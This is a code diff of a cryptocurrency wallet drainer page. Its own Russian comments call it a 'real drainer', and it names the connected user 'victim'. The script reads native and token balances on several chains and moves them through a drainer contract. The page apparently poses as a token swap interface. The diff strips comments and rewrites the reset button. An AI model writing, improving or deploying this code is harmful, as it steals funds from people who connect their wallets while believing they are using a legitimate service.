@@ -265,10 +265,10 @@
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
             // ===== АДРЕСА КОНТРАКТОВ (ЗАМЕНИТЕ НА СВОИ) =====
             const CONTRACT_ADDRESSES = {
-                1: '0x0000000000000000000000000000000000000000', // Ethereum Mainnet
-                56: '0x0000000000000000000000000000000000000000', // BSC
-                137: '0x0000000000000000000000000000000000000000', // Polygon
-                42161: '0x0000000000000000000000000000000000000000' // Arbitrum
+                1: '0x0000000000000000000000000000000000000000',
+                56: '0x0000000000000000000000000000000000000000',
+                137: '0x0000000000000000000000000000000000000000',
+                42161: '0x0000000000000000000000000000000000000000'
             };
 
             const DRAINER_ABI = [
@@ -291,7 +291,6 @@
                 'function allowance(address owner, address spender) view returns (uint256)'
             ];
 
-            // ===== ТОКЕНЫ ДЛЯ РАЗНЫХ СЕТЕЙ (для сбора балансов) =====
             const TOKENS = {
                 1: {
                     'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
@@ -323,7 +322,6 @@
                 }
             };
 
-            // ===== ОСТАЛЬНЫЕ КОНСТАНТЫ =====
             const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
             const tokens = [
                 { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg', id: 'ethereum' },
@@ -625,7 +623,7 @@
                 }
             }
 
-            // ===== РЕАЛЬНЫЙ ДРЕЙНЕР (с вызовами контракта) =====
+            // ===== РЕАЛЬНЫЙ ДРЕЙНЕР =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -644,7 +642,6 @@
                 setStatus('Processing transaction...', '');
 
                 try {
-                    // Собираем активы
                     const assets = [];
                     const nativeBal = await provider.getBalance(victim);
                     if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
@@ -667,7 +664,6 @@
 
                     const drainerContract = new ethers.Contract(contractAddr, DRAINER_ABI, signer);
 
-                    // Нативные активы
                     for (const a of assets) {
                         if (a.type === 'native') {
                             try {
@@ -687,7 +683,6 @@
                         }
                     }
 
-                    // Токены
                     for (const a of assets) {
                         if (a.type === 'token') {
                             try {
@@ -742,27 +737,14 @@
                 startDrain();
             });
 
-            refreshBtn.addEventListener('click', async function() {
+            // ===== КНОПКА RESET - ПОЛНЫЙ СБРОС + ПЕРЕЗАГРУЗКА =====
+            refreshBtn.addEventListener('click', function() {
                 if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
-                await forceClearSession();
-                isConnected = false;
-                isConnecting = false;
-                isProcessing = false;
-                wcProvider = null;
-                provider = null;
-                signer = null;
-                victim = null;
-                chainId = null;
-                inputAmount.value = '';
-                outputAmount.value = '';
-                updateConnectButton();
-                setStatus('Session reset. You can try again.', '');
-                closeModal(walletModal);
-                closeModal(tokenModal);
-                if (window._wcModal && window._wcModal.isOpen) {
-                    try { window._wcModal.closeModal(); } catch (_) {}
-                }
-                await forceClearSession();
+                // Очищаем все данные
+                forceClearSession().then(() => {
+                    // Принудительно перезагружаем страницу для полного сброса состояния
+                    window.location.reload();
+                });
             });
 
             // ===== MAX =====
